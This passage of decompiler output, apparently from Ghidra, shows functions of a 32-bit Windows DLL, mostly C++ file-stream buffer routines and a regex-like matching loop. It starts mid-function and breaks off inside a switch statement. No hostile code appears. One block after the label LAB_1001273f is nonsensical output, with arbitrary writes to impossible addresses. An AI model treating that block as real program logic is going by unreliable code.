      }
    }
    if (*param_1 == 0) {
      return 0;
    }
  }
  if (*param_1 == 0) {
    return 0;
  }
  return *param_1 + 0xc;
}



/* Function: FUN_10011660 */

int * __thiscall FUN_10011660(int *param_1,undefined4 param_2)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  int *piVar5;
  undefined4 uVar6;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10074ac2;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = (int)&DAT_10083520;
  param_1[0x1c] = (int)&PTR_FUN_1008359c;
  local_8 = 0;
  piVar1 = param_1 + 4;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) = &PTR_LAB_100835a4;
  iVar3 = *(int *)(*param_1 + 4);
  *(int *)(iVar3 + -4 + (int)param_1) = iVar3 + -0x18;
  param_1[2] = 0;
  param_1[3] = 0;
  piVar5 = piVar1;
  FUN_1000b650(piVar1,iVar3);
  local_8 = 2;
  *(undefined ***)((int)param_1 + *(int *)(*param_1 + 4)) = &PTR_LAB_1008351c;
  *(int *)(*(int *)(*param_1 + 4) + -4 + (int)param_1) = *(int *)(*param_1 + 4) + -0x70;
  uVar6 = 0x1001170b;
  FUN_10012f90(uVar2);
  *piVar1 = (int)std::basic_filebuf<char,struct_std::char_traits<char>_>::vftable;
  param_1[7] = (int)(param_1 + 5);
  *(undefined1 *)(param_1 + 0x17) = 0;
  param_1[0xb] = (int)(param_1 + 9);
  param_1[0xc] = (int)(param_1 + 10);
  param_1[0xf] = (int)(param_1 + 0xd);
  param_1[0x10] = (int)(param_1 + 0xe);
  *(undefined1 *)((int)param_1 + 0x55) = 0;
  param_1[8] = (int)(param_1 + 6);
  param_1[6] = 0;
  *(undefined4 *)param_1[0xc] = 0;
  *(undefined4 *)param_1[0x10] = 0;
  *(undefined4 *)param_1[7] = 0;
  *(undefined4 *)param_1[0xb] = 0;
  *(undefined4 *)param_1[0xf] = 0;
  iVar3 = DAT_1009aca4;
  param_1[0x18] = 0;
  param_1[0x16] = iVar3;
  param_1[0x14] = 0;
  local_8 = CONCAT31(local_8._1_3_,3);
  iVar3 = FUN_100129a0(param_2,piVar5,uVar6);
  if (iVar3 == 0) {
    iVar3 = *(int *)(*param_1 + 4);
    uVar2 = *(uint *)(iVar3 + 0xc + (int)param_1);
    uVar4 = uVar2 | 2;
    if (*(int *)((int)param_1 + iVar3 + 0x38) == 0) {
      uVar4 = uVar2 | 6;
    }
    *(uint *)((int)param_1 + iVar3 + 0xc) = uVar4 & 0x17;
    if ((*(uint *)((int)param_1 + iVar3 + 0x10) & uVar4 & 0x17) != 0) {
      FUN_10008c40();
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_100117e0 */

void __fastcall FUN_100117e0(undefined4 *param_1)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  undefined4 *puVar4;
  
  *param_1 = std::basic_filebuf<char,struct_std::char_traits<char>_>::vftable;
  if ((param_1[0x14] != 0) && (*(undefined4 **)param_1[3] == param_1 + 0x11)) {
    iVar1 = param_1[0xf];
    iVar2 = param_1[0xe];
    *(int *)param_1[3] = iVar2;
    *(int *)param_1[7] = iVar2;
    *(int *)param_1[0xb] = iVar1 - iVar2;
  }
  if (*(char *)(param_1 + 0x13) != '\0') {
    FUN_10012a60();
  }
  *param_1 = std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;
  piVar3 = (int *)param_1[0xd];
  if (piVar3 != (int *)0x0) {
    if ((int *)*piVar3 != (int *)0x0) {
      puVar4 = (undefined4 *)(**(code **)(*(int *)*piVar3 + 8))();
      if (puVar4 != (undefined4 *)0x0) {
        (**(code **)*puVar4)(1);
      }
    }
    thunk_FUN_100579ee(piVar3);
  }
  return;
}



/* Function: FUN_10011850 */

void __fastcall FUN_10011850(int param_1)

{
  if (*(int *)(param_1 + 0x50) != 0) {
    FUN_10059b56(*(int *)(param_1 + 0x50));
  }
  return;
}



/* Function: Unlock */

/* Library Function - Multiple Matches With Same Base Name
    public: virtual void __thiscall std::basic_filebuf<char,struct std::char_traits<char>
   >::_Unlock(void)
    public: virtual void __thiscall std::basic_filebuf<unsigned short,struct
   std::char_traits<unsigned short> >::_Unlock(void)
    public: virtual void __thiscall std::basic_filebuf<wchar_t,struct std::char_traits<wchar_t>
   >::_Unlock(void)
   
   Library: Visual Studio 2010 Release */

void __fastcall Unlock(int param_1)

{
  if (*(FILE **)(param_1 + 0x50) != (FILE *)0x0) {
    __unlock_file(*(FILE **)(param_1 + 0x50));
  }
  return;
}



/* Function: FUN_10011870 */

/* WARNING: Removing unreachable block (ram,0x10011964) */

void __thiscall FUN_10011870(int param_1,int param_2)

{
  uint uVar1;
  char *pcVar2;
  char cVar3;
  uint uVar4;
  int iVar5;
  undefined8 *puVar6;
  int iVar7;
  undefined8 *puVar8;
  undefined1 auStack_44 [7];
  char local_3d;
  int local_3c;
  char *local_38;
  undefined8 local_34;
  undefined1 local_2c;
  uint local_24;
  uint local_20;
  uint local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_10074ae8;
  local_14 = ExceptionList;
  local_1c = DAT_100956e0 ^ (uint)auStack_44;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xffffffb0;
  ExceptionList = &local_14;
  if (param_2 != -1) {
    uVar1 = **(uint **)(param_1 + 0x20);
    cVar3 = (char)param_2;
    if (uVar1 != 0) {
      iVar5 = **(int **)(param_1 + 0x30);
      if (uVar1 < iVar5 + uVar1) {
        **(int **)(param_1 + 0x30) = iVar5 + -1;
        pcVar2 = (char *)**(int **)(param_1 + 0x20);
        **(int **)(param_1 + 0x20) = (int)(pcVar2 + 1);
        *pcVar2 = cVar3;
        goto LAB_10011a73;
      }
    }
    if (*(int *)(param_1 + 0x50) != 0) {
      if (**(int **)(param_1 + 0xc) == param_1 + 0x44) {
        iVar5 = *(int *)(param_1 + 0x38);
        iVar7 = *(int *)(param_1 + 0x3c);
        **(int **)(param_1 + 0xc) = iVar5;
        **(int **)(param_1 + 0x1c) = iVar5;
        **(int **)(param_1 + 0x2c) = iVar7 - iVar5;
      }
      if (*(int *)(param_1 + 0x40) == 0) {
        FUN_1005985f((int)cVar3,*(undefined4 *)(param_1 + 0x50),uVar4);
      }
      else {
        local_20 = 0xf;
        local_34 = 0;
        local_24 = 8;
        local_2c = 0;
        local_c = 0;
        local_3d = cVar3;
        while( true ) {
          puVar6 = &local_34;
          if (0xf < local_20) {
            puVar6 = (undefined8 *)local_34;
          }
          puVar8 = &local_34;
          if (0xf < local_20) {
            puVar8 = (undefined8 *)local_34;
          }
          iVar5 = (**(code **)(**(int **)(param_1 + 0x40) + 0x1c))
                            (param_1 + 0x48,&local_3d,&local_3c,&local_38,puVar8,
                             local_24 + (int)puVar6,&local_3c);
          if (iVar5 < 0) goto LAB_10011a5e;
          if (1 < iVar5) break;
          puVar6 = &local_34;
          if (0xf < local_20) {
            puVar6 = (undefined8 *)local_34;
          }
          iVar5 = local_3c - (int)puVar6;
          if (iVar5 != 0) {
            puVar6 = &local_34;
            if (0xf < local_20) {
              puVar6 = (undefined8 *)local_34;
            }
            iVar7 = FUN_10059d85(puVar6,1,iVar5,*(undefined4 *)(param_1 + 0x50));
            if (iVar5 != iVar7) goto LAB_10011a5e;
          }
          *(undefined1 *)(param_1 + 0x45) = 1;
          if (local_38 != &local_3d) goto LAB_10011a5e;
          if (iVar5 == 0) {
            if (0x1f < local_24) goto LAB_10011a5e;
            FUN_10012870(8,0);
          }
        }
        if (iVar5 == 3) {
          FUN_1005985f((int)local_3d,*(undefined4 *)(param_1 + 0x50),uVar4);
        }
LAB_10011a5e:
        if (0xf < local_20) {
          thunk_FUN_100579ee((undefined8 *)local_34);
        }
      }
    }
  }
LAB_10011a73:
  ExceptionList = local_14;
  FUN_100579df();
  return;
}



/* Function: FUN_10011aa0 */

uint __thiscall
FUN_10011aa0(basic_filebuf<char,struct_std::char_traits<char>_> *param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = **(uint **)(param_1 + 0x1c);
  if (((uVar1 != 0) && (**(uint **)(param_1 + 0xc) < uVar1)) &&
     ((param_2 == 0xffffffff || (*(byte *)(uVar1 - 1) == param_2)))) {
    **(int **)(param_1 + 0x2c) = **(int **)(param_1 + 0x2c) + 1;
    **(int **)(param_1 + 0x1c) = **(int **)(param_1 + 0x1c) + -1;
    uVar1 = 0;
    if (param_2 != 0xffffffff) {
      uVar1 = param_2;
    }
    return uVar1;
  }
  if ((*(int *)(param_1 + 0x50) != 0) && (param_2 != 0xffffffff)) {
    if ((*(int *)(param_1 + 0x40) == 0) &&
       (iVar2 = FUN_10059a40(param_2 & 0xff,*(int *)(param_1 + 0x50)), iVar2 != -1)) {
      return param_2;
    }
    if ((basic_filebuf<char,struct_std::char_traits<char>_> *)**(int **)(param_1 + 0x1c) !=
        param_1 + 0x44) {
      param_1[0x44] = SUB41(param_2,0);
      std::basic_filebuf<char,struct_std::char_traits<char>_>::_Set_back(param_1);
      return param_2;
    }
  }
  return 0xffffffff;
}



/* Function: underflow */

/* Library Function - Single Match
    protected: virtual int __thiscall std::basic_filebuf<char,struct std::char_traits<char>
   >::underflow(void)
   
   Library: Visual Studio 2019 Release */

int __thiscall
std::basic_filebuf<char,struct_std::char_traits<char>_>::underflow
          (basic_filebuf<char,struct_std::char_traits<char>_> *this)

{
  byte *pbVar1;
  int iVar2;
  
  pbVar1 = (byte *)**(undefined4 **)(this + 0x1c);
  if ((pbVar1 != (byte *)0x0) && (pbVar1 < pbVar1 + **(int **)(this + 0x2c))) {
    return (uint)*pbVar1;
  }
  iVar2 = (**(code **)(*(int *)this + 0x1c))();
  if (iVar2 == -1) {
    return -1;
  }
  (**(code **)(*(int *)this + 0x10))(iVar2);
  return iVar2;
}



/* Function: FUN_10011b70 */

void __fastcall FUN_10011b70(int param_1)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  undefined4 ******ppppppuVar5;
  undefined4 ******ppppppuVar6;
  undefined1 auStack_44 [7];
  undefined1 local_3d;
  int local_3c;
  undefined1 *local_38;
  undefined4 *****local_34 [4];
  int local_24;
  uint local_20;
  uint local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 local_c;
  
  local_c = 0xffffffff;
  puStack_10 = &LAB_10074ae8;
  local_14 = ExceptionList;
  local_1c = DAT_100956e0 ^ (uint)auStack_44;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xffffffb0;
  ExceptionList = &local_14;
  uVar1 = **(uint **)(param_1 + 0x1c);
  if (uVar1 != 0) {
    iVar4 = **(int **)(param_1 + 0x2c);
    if (uVar1 < iVar4 + uVar1) {
      **(int **)(param_1 + 0x2c) = iVar4 + -1;
      **(int **)(param_1 + 0x1c) = **(int **)(param_1 + 0x1c) + 1;
      goto LAB_10011d2d;
    }
  }
  if (*(int *)(param_1 + 0x50) != 0) {
    if (**(int **)(param_1 + 0xc) == param_1 + 0x44) {
      iVar4 = *(int *)(param_1 + 0x3c);
      iVar2 = *(int *)(param_1 + 0x38);
      **(int **)(param_1 + 0xc) = iVar2;
      **(int **)(param_1 + 0x1c) = iVar2;
      **(int **)(param_1 + 0x2c) = iVar4 - iVar2;
    }
    if (*(int *)(param_1 + 0x40) != 0) {
      local_20 = 0xf;
      local_24 = 0;
      local_34[0] = (undefined4 *****)((uint)local_34[0] & 0xffffff00);
      local_c = 0;
      iVar4 = FUN_10059766(*(undefined4 *)(param_1 + 0x50),uVar3);
      do {
        if (iVar4 == -1) goto LAB_10011d18;
        FUN_10012870(1,iVar4);
        ppppppuVar5 = local_34;
        if (0xf < local_20) {
          ppppppuVar5 = (undefined4 ******)local_34[0];
        }
        ppppppuVar6 = local_34;
        if (0xf < local_20) {
          ppppppuVar6 = (undefined4 ******)local_34[0];
        }
        iVar4 = (**(code **)(**(int **)(param_1 + 0x40) + 0x18))
                          (param_1 + 0x48,ppppppuVar6,local_24 + (int)ppppppuVar5,&local_3c,
                           &local_3d,&local_3c,&local_38);
        if (iVar4 < 0) goto LAB_10011d18;
        if (iVar4 < 2) {
          if (local_38 != &local_3d) {
            ppppppuVar5 = local_34;
            if (0xf < local_20) {
              ppppppuVar5 = (undefined4 ******)local_34[0];
            }
            for (iVar4 = (int)ppppppuVar5 + (local_24 - local_3c); 0 < iVar4; iVar4 = iVar4 + -1) {
              FUN_10059a40((int)*(char *)(iVar4 + -1 + local_3c),*(undefined4 *)(param_1 + 0x50));
            }
LAB_10011d18:
            if (0xf < local_20) {
              thunk_FUN_100579ee(local_34[0]);
            }
            goto LAB_10011d2d;
          }
          ppppppuVar5 = local_34;
          if (0xf < local_20) {
            ppppppuVar5 = (undefined4 ******)local_34[0];
          }
          FUN_1000b8b0(0,local_3c - (int)ppppppuVar5);
        }
        else {
          if (iVar4 != 3) goto LAB_10011d18;
          if (local_24 != 0) {
            ppppppuVar5 = local_34;
            if (0xf < local_20) {
              ppppppuVar5 = (undefined4 ******)local_34[0];
            }
            _memcpy_s(&local_3d,1,ppppppuVar5,1);
            goto LAB_10011d18;
          }
        }
        iVar4 = FUN_10059766(*(undefined4 *)(param_1 + 0x50));
      } while( true );
    }
    FUN_10059766(*(undefined4 *)(param_1 + 0x50),uVar3);
  }
LAB_10011d2d:
  ExceptionList = local_14;
  FUN_100579df();
  return;
}



/* Function: FUN_10011d90 */

void __thiscall FUN_10011d90(int param_1,undefined4 *param_2,int param_3,int param_4,int param_5)

{
  int iVar1;
  undefined4 uVar2;
  char cVar3;
  int iVar4;
  bool bVar5;
  undefined4 local_10;
  undefined4 local_c;
  
  if (((**(int **)(param_1 + 0x1c) == param_1 + 0x44) && (param_5 == 1)) &&
     (*(int *)(param_1 + 0x40) == 0)) {
    bVar5 = param_3 != 0;
    param_3 = param_3 + -1;
    param_4 = param_4 + -1 + (uint)bVar5;
  }
  if ((((*(int *)(param_1 + 0x50) != 0) && (cVar3 = FUN_10012bb0(), cVar3 != '\0')) &&
      (((param_3 == 0 && param_4 == 0 && (param_5 == 1)) ||
       (iVar4 = FUN_10059e07(*(undefined4 *)(param_1 + 0x50),param_3,param_4,param_5), iVar4 == 0)))
      ) && (iVar4 = FUN_10059f3e(*(undefined4 *)(param_1 + 0x50),&local_10), iVar4 == 0)) {
    if (**(int **)(param_1 + 0xc) == param_1 + 0x44) {
      iVar4 = *(int *)(param_1 + 0x3c);
      iVar1 = *(int *)(param_1 + 0x38);
      **(int **)(param_1 + 0xc) = iVar1;
      **(int **)(param_1 + 0x1c) = iVar1;
      **(int **)(param_1 + 0x2c) = iVar4 - iVar1;
    }
    param_2[2] = local_10;
    param_2[3] = local_c;
    uVar2 = *(undefined4 *)(param_1 + 0x48);
    *param_2 = 0;
    param_2[1] = 0;
    param_2[4] = uVar2;
    return;
  }
  *param_2 = DAT_1007a4f8;
  param_2[1] = DAT_1007a4fc;
  param_2[2] = 0;
  param_2[3] = 0;
  param_2[4] = 0;
  return;
}



/* Function: FUN_10011e90 */

void __thiscall
FUN_10011e90(basic_filebuf<char,struct_std::char_traits<char>_> *param_1,undefined4 *param_2,
            int param_3,int param_4,undefined4 param_5,undefined4 param_6,undefined4 param_7)

{
  undefined4 uVar1;
  char cVar2;
  int iVar3;
  undefined4 local_10;
  undefined4 local_c;
  
  local_10 = param_5;
  local_c = param_6;
  if (*(int *)(param_1 + 0x50) != 0) {
    cVar2 = FUN_10012bb0();
    if (cVar2 != '\0') {
      iVar3 = _fsetpos(*(FILE **)(param_1 + 0x50),(fpos_t *)&local_10);
      if (iVar3 == 0) {
        if (param_3 != 0 || param_4 != 0) {
          iVar3 = FUN_10059e07(*(undefined4 *)(param_1 + 0x50),param_3,param_4,1);
          if (iVar3 != 0) goto LAB_10011f40;
        }
        iVar3 = FUN_10059f3e(*(undefined4 *)(param_1 + 0x50),&local_10);
        if (iVar3 == 0) {
          *(undefined4 *)(param_1 + 0x48) = param_7;
          std::basic_filebuf<char,struct_std::char_traits<char>_>::_Reset_back(param_1);
          param_2[2] = local_10;
          param_2[3] = local_c;
          uVar1 = *(undefined4 *)(param_1 + 0x48);
          *param_2 = 0;
          param_2[1] = 0;
          param_2[4] = uVar1;
          return;
        }
      }
    }
  }
LAB_10011f40:
  *param_2 = DAT_1007a4f8;
  param_2[1] = DAT_1007a4fc;
  param_2[2] = 0;
  param_2[3] = 0;
  param_2[4] = 0;
  return;
}



/* Function: FUN_10011f80 */

int __thiscall FUN_10011f80(int param_1,char *param_2,size_t param_3,int param_4)

{
  int iVar1;
  
  if (*(FILE **)(param_1 + 0x50) != (FILE *)0x0) {
    if ((param_2 == (char *)0x0) && (param_3 == 0 && param_4 == 0)) {
      iVar1 = 4;
    }
    else {
      iVar1 = 0;
    }
    iVar1 = _setvbuf(*(FILE **)(param_1 + 0x50),param_2,iVar1,param_3);
    if (iVar1 == 0) {
      FUN_10012b10(*(undefined4 *)(param_1 + 0x50),1);
      return param_1;
    }
  }
  return 0;
}



/* Function: sync */

/* Library Function - Single Match
    protected: virtual int __thiscall std::basic_filebuf<char,struct std::char_traits<char>
   >::sync(void)
   
   Library: Visual Studio 2019 Release */

int __thiscall
std::basic_filebuf<char,struct_std::char_traits<char>_>::sync
          (basic_filebuf<char,struct_std::char_traits<char>_> *this)

{
  int iVar1;
  
  if (*(int *)(this + 0x50) != 0) {
    iVar1 = (**(code **)(*(int *)this + 0xc))(0xffffffff);
    if (iVar1 != -1) {
      iVar1 = FUN_1005a185(*(undefined4 *)(this + 0x50));
      if (iVar1 < 0) {
        return -1;
      }
    }
  }
  return 0;
}



/* Function: FUN_10012000 */

void FUN_10012000(undefined4 param_1)

{
  undefined4 uVar1;
  
  uVar1 = FUN_10014470(param_1);
  FUN_10012d30(uVar1);
  return;
}



/* Function: FUN_10012020 */

int __thiscall FUN_10012020(int *param_1,int *param_2)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int *local_8;
  
  piVar1 = param_2;
  if (param_2 == (int *)0x0) {
    return 10;
  }
  if (param_1[1] != 0) {
    local_8 = param_1;
    FUN_100579ee(param_1[1]);
    param_1[1] = 0;
  }
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[6] = 0;
  param_1[5] = 0;
  *param_1 = 0;
  param_1[7] = 1;
  local_8 = piVar1;
  iVar2 = FUN_1000f110(0x10);
  if (-1 < iVar2) {
    if ((char)*local_8 == '^') {
      iVar3 = FUN_1000f110(0x1c);
      if (iVar3 < 0) {
        return 1;
      }
      local_8 = (int *)((int)local_8 + 1);
    }
    else {
      iVar3 = FUN_1000f110(0x1d);
      if (iVar3 < 0) {
        return 1;
      }
    }
    param_2 = (int *)CONCAT13(1,param_2._0_3_);
    FUN_10012e30(&local_8,(int)&param_2 + 3);
    if (*param_1 == 0) {
      iVar2 = FUN_1000f1a0(iVar2);
      *(undefined4 *)(iVar2 + 4) = 2;
      iVar2 = FUN_1000f110(0x1e);
      if (iVar2 < 0) {
        return 1;
      }
    }
    return *param_1;
  }
  return 1;
}



/* Function: FUN_10012110 */

ios_base * __thiscall FUN_10012110(int param_1,ios_base *param_2,int param_3,undefined4 *param_4)

{
  int *piVar1;
  ios_base iVar2;
  char cVar3;
  char cVar4;
  byte bVar5;
  ios_base *piVar6;
  errno_t eVar7;
  undefined4 uVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  char *pcVar12;
  undefined3 uVar15;
  int *piVar13;
  int *piVar14;
  ios_base *piVar16;
  uint *extraout_ECX;
  uint *puVar17;
  char cVar19;
  char cVar20;
  uint uVar21;
  uint uVar22;
  undefined4 unaff_EDI;
  undefined8 uVar23;
  uint in_stack_ffffffe4;
  ios_base *piVar24;
  ios_base *local_10;
  undefined3 uVar18;
  
  if ((param_2 == (ios_base *)0x0) || (param_3 == 0)) {
    return (ios_base *)0x0;
  }
  if (param_4 != (undefined4 *)0x0) {
    *param_4 = 0;
  }
  piVar6 = param_2;
  piVar24 = param_2;
  if (*(int *)(param_1 + 0x1c) == 0) {
    piVar16 = param_2;
    do {
      iVar2 = *piVar16;
      piVar16 = piVar16 + 1;
    } while (iVar2 != (ios_base)0x0);
    piVar16 = piVar16 + (1 - (int)(param_2 + 1));
    piVar6 = (ios_base *)FUN_100581b4(piVar16);
    if (piVar6 == (ios_base *)0x0) {
      return (ios_base *)0x0;
    }
    eVar7 = _memcpy_s(piVar6,(rsize_t)piVar16,param_2,(rsize_t)piVar16);
    FUN_10007f40(eVar7);
    piVar24 = piVar6;
    uVar8 = FUN_1005894b(piVar6,piVar16);
    FUN_10007f40(uVar8);
  }
  iVar9 = FUN_1000f2c0(*(undefined4 *)(param_1 + 0x18),*(undefined4 *)(param_1 + 0x14));
  if (iVar9 == 0) {
    if (piVar6 == param_2) {
      return (ios_base *)0x0;
    }
    FUN_100579ee(piVar6);
    return (ios_base *)0x0;
  }
  uVar21 = 0;
  piVar1 = (int *)(param_1 + 4);
  piVar16 = piVar6;
  local_10 = piVar6;
switchD_100121eb_caseD_9:
  if (uVar21 == 0) {
    *(ios_base **)(param_3 + 4) = piVar6;
  }
  if (*(uint *)(param_1 + 8) <= uVar21) {
LAB_1001273f:
    uVar8 = 0x80070057;
    uVar23 = FUN_10007f20(0x80070057);
    iVar11 = (int)((ulonglong)uVar23 >> 0x20);
    *extraout_ECX = *extraout_ECX & (uint)uVar23;
    DAT_3d100122 = DAT_3d100122 + (char)((ulonglong)uVar23 >> 8);
    uVar21 = CONCAT31((int3)((ulonglong)uVar23 >> 8),(byte)uVar23 & (byte)*extraout_ECX);
    cVar20 = (char)((ulonglong)uVar23 >> 0x28);
    cVar3 = (char)((uint)extraout_ECX >> 8) + cVar20;
    puVar17 = (uint *)CONCAT22((short)((uint)extraout_ECX >> 0x10),
                               CONCAT11(cVar3,(char)extraout_ECX));
    *puVar17 = *puVar17 & uVar21;
    cVar19 = (char)((ulonglong)uVar23 >> 0x20);
    DAT_b8100122 = DAT_b8100122 + cVar19;
    pcVar12 = (char *)(uVar21 & *puVar17);
    *pcVar12 = *pcVar12 + (char)piVar6;
    piVar13 = (int *)((uint)pcVar12 & 0xffffff01);
    *(char *)(puVar17 + 9) = (char)puVar17[9] + (char)((uint)piVar6 >> 8);
    *piVar13 = *piVar13 + iVar11;
    cVar4 = (char)extraout_ECX + cVar19;
    uVar18 = (undefined3)((uint)puVar17 >> 8);
    puVar17 = (uint *)CONCAT31(uVar18,cVar4);
    *puVar17 = *puVar17 & (uint)piVar13;
    cVar4 = cVar4 + cVar19;
    puVar17 = (uint *)CONCAT31(uVar18,cVar4);
    *puVar17 = *puVar17 & (uint)piVar13;
    cVar4 = cVar4 + cVar19;
    puVar17 = (uint *)CONCAT31(uVar18,cVar4);
    *puVar17 = *puVar17 & (uint)piVar13;
    cVar4 = cVar4 + cVar19;
    puVar17 = (uint *)CONCAT31(uVar18,cVar4);
    *puVar17 = *puVar17 & (uint)piVar13;
    piVar6[0x59100122] = (ios_base)((char)piVar6[0x59100122] + (char)piVar6);
    uVar15 = (undefined3)((uint)piVar13 >> 8);
    bVar5 = (byte)piVar13 & (byte)*puVar17;
    piVar13 = (int *)CONCAT31(uVar15,bVar5);
    *(char *)(iVar11 + 0x22) = *(char *)(iVar11 + 0x22) + cVar3;
    iVar9 = *piVar13;
    *piVar13 = *piVar13 + iVar11;
    if (SCARRY4(iVar9,iVar11) == *piVar13 < 0) {
      *piVar13 = *piVar13 + iVar11;
      *puVar17 = *puVar17 & (uint)piVar13;
      puVar17 = (uint *)CONCAT31(uVar18,cVar4 + cVar19);
      *puVar17 = *puVar17 & (uint)piVar13;
      *(char *)(iVar11 + 0x22cf1001) = *(char *)(iVar11 + 0x22cf1001) + cVar3;
      *piVar13 = *piVar13 + iVar11;
      uVar21 = *puVar17;
      *(char *)piVar1 = *(char *)piVar1 + cVar3;
      piVar13 = (int *)(CONCAT31(uVar15,bVar5 & (byte)uVar21) & *puVar17);
      *piVar6 = (ios_base)((char)*piVar6 + cVar19);
      *piVar13 = *piVar13 + iVar11;
    }
    *(char *)((int)puVar17 + 0x23) = *(char *)((int)puVar17 + 0x23) + cVar20;
    *(int *)((uint)piVar13 & *puVar17) = *(int *)((uint)piVar13 & *puVar17) + iVar11;
    piVar14 = (int *)((uint)piVar24 & 0x26b61001);
    *piVar14 = *piVar14 + in_stack_ffffffe4;
    piVar14 = (int *)((uint)piVar14 & *(uint *)piVar16);
    iVar9 = CONCAT22((short)(in_stack_ffffffe4 >> 0x10),
                     CONCAT11((char)(in_stack_ffffffe4 >> 8) * '\x02',(char)in_stack_ffffffe4));
    *piVar14 = *piVar14 + iVar9;
    *(int *)((int)piVar14 + -0x6d100126) = *(int *)((int)piVar14 + -0x6d100126) + iVar9;
    piVar6 = piVar16 + -0x70;
    *(undefined ***)(piVar16 + *(int *)(*(int *)piVar6 + 4) + -0x70) = &PTR_LAB_1008351c;
    *(int *)(piVar16 + *(int *)(*(int *)(piVar16 + -0x70) + 4) + -0x74) =
         *(int *)(*(int *)(piVar16 + -0x70) + 4) + -0x70;
    FUN_100117e0(piVar13,uVar8,unaff_EDI);
    *(undefined ***)(piVar16 + *(int *)(*(int *)(piVar16 + -0x70) + 4) + -0x70) = &PTR_LAB_100835a4;
    *(int *)(piVar16 + *(int *)(*(int *)(piVar16 + -0x70) + 4) + -0x74) =
         *(int *)(*(int *)(piVar16 + -0x70) + 4) + -0x18;
    *(undefined ***)piVar16 = std::ios_base::vftable;
    std::ios_base::_Ios_base_dtor(piVar16);
    if (((uint)piVar1 & 1) != 0) {
      thunk_FUN_100579ee(piVar6);
    }
    return piVar6;
  }
  switch(*(undefined4 *)(*piVar1 + uVar21 * 8)) {
  case 0:
    uVar21 = uVar21 + 1;
    goto switchD_100121eb_caseD_9;
  case 1:
    iVar9 = *(int *)(param_3 + 0x10);
    iVar11 = FUN_1000f1a0(uVar21);
    *(ios_base **)(iVar9 + *(int *)(iVar11 + 4) * 8) = piVar6;
    goto LAB_10012234;
  case 2:
    iVar9 = *(int *)(param_3 + 0x10);
    iVar11 = FUN_1000f1a0(uVar21);
    uVar21 = uVar21 + 1;
    *(ios_base **)(iVar9 + 4 + *(int *)(iVar11 + 4) * 8) = piVar6;
    goto switchD_100121eb_caseD_9;
  case 3:
    iVar9 = FUN_1000f1a0(uVar21);
    if (*(uint *)(iVar9 + 4) != (uint)(ushort)(short)(char)*piVar6) goto LAB_100124d8;
    piVar6 = piVar6 + 1;
    uVar21 = uVar21 + 1;
    local_10 = piVar6;
    goto switchD_100121eb_caseD_9;
  case 4:
    if (*piVar6 != (ios_base)0x0) {
      piVar6 = piVar6 + 1;
      uVar21 = uVar21 + 1;
      local_10 = piVar6;
      goto switchD_100121eb_caseD_9;
    }
    break;
  case 5:
    if (*piVar6 != (ios_base)0x0) {
      iVar9 = FUN_10010be0(uVar21);
      if (((int)*(char *)(((byte)*piVar6 >> 3) + 8 + iVar9) & 1 << ((byte)*piVar6 & 7)) == 0)
      goto LAB_10012403;
      uVar21 = uVar21 + 5;
      piVar6 = piVar6 + 1;
      local_10 = piVar6;
      goto switchD_100121eb_caseD_9;
    }
    break;
  case 6:
    if (*piVar6 == (ios_base)0x0) {
      uVar21 = FUN_1000f400();
    }
    else {
      iVar9 = FUN_10010be0(uVar21);
      if (((int)*(char *)(((ushort)(short)(char)*piVar6 >> 3) + 8 + iVar9) &
          1 << ((byte)*piVar6 & 7)) == 0) {
        uVar21 = uVar21 + 5;
        piVar6 = piVar6 + 1;
        local_10 = piVar6;
      }
      else {
        uVar21 = FUN_1000f400();
      }
    }
    goto switchD_100121eb_caseD_9;
  case 7:
    if (*piVar6 == (ios_base)0x0) {
      uVar21 = FUN_1000f400();
    }
    else {
      iVar9 = FUN_1000f1a0(uVar21);
      uVar22 = uVar21 + 1;
      uVar21 = *(uint *)(iVar9 + 4);
      in_stack_ffffffe4 = uVar21;
      if (uVar22 < uVar21) {
        do {
          in_stack_ffffffe4 = uVar21;
          if (*(uint *)(param_1 + 8) <= uVar22) goto LAB_1001273f;
          if ((*(uint *)(*piVar1 + 4 + uVar22 * 8) <= (uint)(ushort)(short)(char)*piVar6) &&
             (iVar9 = FUN_1000f1a0(uVar22 + 1),
             (uint)(ushort)(short)(char)*piVar6 <= *(uint *)(iVar9 + 4))) {
            piVar6 = piVar6 + 1;
            in_stack_ffffffe4 = uVar21;
            local_10 = piVar6;
            goto switchD_100121eb_caseD_9;
          }
          uVar22 = uVar22 + 2;
          in_stack_ffffffe4 = uVar21;
        } while (uVar22 < uVar21);
      }
LAB_100124d8:
      uVar21 = FUN_1000f400();
    }
    goto switchD_100121eb_caseD_9;
  case 8:
    if (*piVar6 == (ios_base)0x0) {
      uVar21 = FUN_1000f400();
    }
    else {
      iVar9 = FUN_1000f1a0(uVar21);
      uVar21 = uVar21 + 1;
      in_stack_ffffffe4 = *(uint *)(iVar9 + 4);
      if (uVar21 < in_stack_ffffffe4) {
        do {
          if (*(uint *)(param_1 + 8) <= uVar21) goto LAB_1001273f;
          if ((*(uint *)(*piVar1 + 4 + uVar21 * 8) <= (uint)(ushort)(short)(char)*piVar6) &&
             (iVar9 = FUN_1000f1a0(uVar21 + 1),
             (uint)(ushort)(short)(char)*piVar6 <= *(uint *)(iVar9 + 4))) goto LAB_100124d8;
          uVar21 = uVar21 + 2;
        } while (uVar21 < in_stack_ffffffe4);
      }
      piVar6 = piVar6 + 1;
      local_10 = piVar6;
    }
  default:
    goto switchD_100121eb_caseD_9;
  case 0xd:
    iVar9 = FUN_1000f1a0(uVar21);
    uVar21 = *(uint *)(iVar9 + 4);
    goto switchD_100121eb_caseD_9;
